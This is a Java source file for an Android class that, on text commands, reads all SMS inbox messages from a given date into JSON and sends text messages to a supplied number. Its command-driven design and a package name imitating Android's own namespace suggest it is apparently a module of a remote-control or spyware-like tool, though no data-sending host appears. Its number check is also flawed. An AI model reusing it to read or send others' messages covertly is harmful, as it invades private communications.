package com.android.controller.functionalities;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.SmsManager;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SMSReader {
    private final Context context;

    public SMSReader(Context context) {
        this.context = context;
    }

    public String readSMS(String command) throws JSONException, ParseException {
        JSONArray smsArray = new JSONArray();
        String[] words = command.split(" ");
        String dateString;
        if (words.length > 1) {
            dateString = words[1];
        } else {
            SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy");
            Date currentDate = new Date();
            String formattedDate = dateFormat.format(currentDate);
            dateString = formattedDate;
        }
        // Convert the input date string to a Date object
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy");
        Date targetDate = dateFormat.parse(dateString);

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = context.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");

            // Construct a selection argument to filter messages by date
            String selection = "date >= ? AND date <= ?";
            String[] selectionArgs = {
                    String.valueOf(targetDate.getTime()),
                    String.valueOf(targetDate.getTime() + 86400000) // Adding 24 hours to include messages of the entire day
            };
            Cursor cursor = contentResolver.query(uri, null, selection, selectionArgs, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int senderAddressIndex = cursor.getColumnIndex("address");
                    int messageBodyIndex = cursor.getColumnIndex("body");
                    int timestampIndex = cursor.getColumnIndex("date");
                    String senderAddress = cursor.getString(senderAddressIndex);
                    String messageBody = cursor.getString(messageBodyIndex);
                    long timestamp = cursor.getLong(timestampIndex);
                    JSONObject smsObject = new JSONObject();
                    smsObject.put("sender", senderAddress);
                    smsObject.put("message", messageBody);
                    smsObject.put("time", formatTimestamp(timestamp));
                    smsArray.put(smsObject);
                }
                cursor.close();
            }
        }

        // Now smsArray contains messages from the specified date.
        return smsArray.toString();
    }

    private String formatTimestamp(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        Date date = new Date(timestamp);
        return sdf.format(date);
    }

    private String getContactName(String phoneNumber) {
        String contactName = phoneNumber;
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);

        if (cursor != null) {
            if (cursor.moveToFirst()) {
//                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }
            cursor.close();
        }

        return contactName;
    }

    public String sendSMS(String command) throws JSONException {
        String[] words = command.split(" ");
        String phoneNumber, message = "";
        JSONObject jsonObject = new JSONObject();

        if (words.length > 2) {
            if (isNumber(words[1]) && words[1].length() == 10) {
                phoneNumber = words[1];
                for (int i = 2; i < words.length; i++)
                    message = message + " " + words[i];
                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), PendingIntent.FLAG_IMMUTABLE);
                    PendingIntent deliveredIntent = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), PendingIntent.FLAG_IMMUTABLE);
                    smsManager.sendTextMessage(phoneNumber, null, message, sentIntent, deliveredIntent);
                    jsonObject.put("ACK", "Message sent");
                    return jsonObject.toString();
                } catch (Exception e) {
                    jsonObject.put("Error", e.toString());
                    return jsonObject.toString();
                }
            }
        } else {
            jsonObject.put("Error", "Wrong arguments");
            return jsonObject.toString();
        }
        return null;
    }

    public boolean isNumber(String input) {
        // Define a regular expression to match any digit
        String regex = ".*\\d.*";

        // Create a Pattern object and a Matcher
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(input);

        // Check if the string contains a number
        return matcher.matches();
    }

}
